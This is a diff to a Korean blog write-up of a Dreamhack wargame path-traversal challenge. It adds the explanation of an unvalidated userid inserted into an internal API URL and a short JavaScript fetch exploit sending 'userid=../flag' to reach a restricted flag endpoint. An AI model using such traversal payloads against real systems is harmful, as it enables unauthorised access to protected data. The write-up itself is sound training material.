@@ -29,7 +29,7 @@ link: [https://dreamhack.io/wargame/challenges/12](https://dreamhack.io/wargame/
 
 
 
-## 코드:
+## 소스 코드:
 
 ```python
 #!/usr/bin/python3
@@ -108,7 +108,80 @@ application = app # app.run(host='0.0.0.0', port=8000)
 
 
 
-## 풀이: 
+## 풀이 시도: 
+
+![image.png](/images/image-2.png)
+
+일단 웹에 들어오면 이런 화면을 볼 수 있다. 해당 화면에서 `user id`를 `guest`로 해놓고 `view`를 누르게 되면..
+
+
+
+![image.png](/images/image-3.png)
+
+위 사진과 같은 값이 출력이 된다. `userid`에 `guest`를 넣으면 키 값이 0으로 처리되어 저런 딕셔너리 형태가 출려된다. 그래서 `userid`에 `admin`을 넣어서 해보면..
+
+
+
+![image.png](/images/image-4.png)
+
+위와 같이 `admin`관련 정보가 출력된다.
+
+
+
+```python
+users = {
+    '0': {
+        'userid': 'guest',
+        'level': 1,
+        'password': 'guest'
+    },
+    '1': {
+        'userid': 'admin',
+        'level': 9999,
+        'password': 'admin'
+    }
+}
+```
+
+이 소스 코드의 정보가 출력이 된것이다. 그러면 뻘짓은 그만하고 이 문제를 어떻게 풀어야하는지 확인해보자.
+
+
+
+소스코드에서 **pathtraversal** 취약점이 발생할 수 있는 부분은 다음과 같다.
+
+```python
+@app.route('/get_info', methods=['GET', 'POST'])
+def get_info():
+    if request.method == 'GET':
+        return render_template('get_info.html')
+    elif request.method == 'POST':
+        userid = request.form.get('userid', '')
+        info = requests.get(f'{API_HOST}/api/user/{userid}').text
+        return render_template('get_info.html', info=info)
+```
+
+`get_info()` 함수에서는 사용자가 POST 요청으로 전달한 `userid` 값을 받아 사용자 정보를 조회하는데, 이때 입력받은 `userid` 값을 별도의 검증 없이 `requests.get()`의 URL 경로에 삽입하고 있어 Path Traversal 취약점이 발생한다.
+
+따라서 `userid`에 `../flag`를 입력하면 `/api/user/../flag`라는 경로가 생성되고, 상위 경로를 의미하는 `../`에 의해 `/api/flag`로 변경된다. 그리고 이것을 이용하면 서버 내부에서 접근이 제한된 `/api/flag`를 요청하도록 유도할 수 있다.
+
+
+
+## 익스플로잇 코드:
+
+```
+fetch('/get_info', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded' },
+    body: 'userid=../flag'
+})
+.then(response => response.text())
+.then(html => {
+    document.open();
+    document.write(html);
+    document.close();
+});
+```
 
 
 
@@ -118,6 +191,9 @@ application = app # app.run(host='0.0.0.0', port=8000)
 
 &nbsp;
 
-&nbsp;
+## 결과:
 
-&nbsp;
+![image.png](/images/image-5.png)
+
+이렇게 플래그를 얻을 수 있다.
+
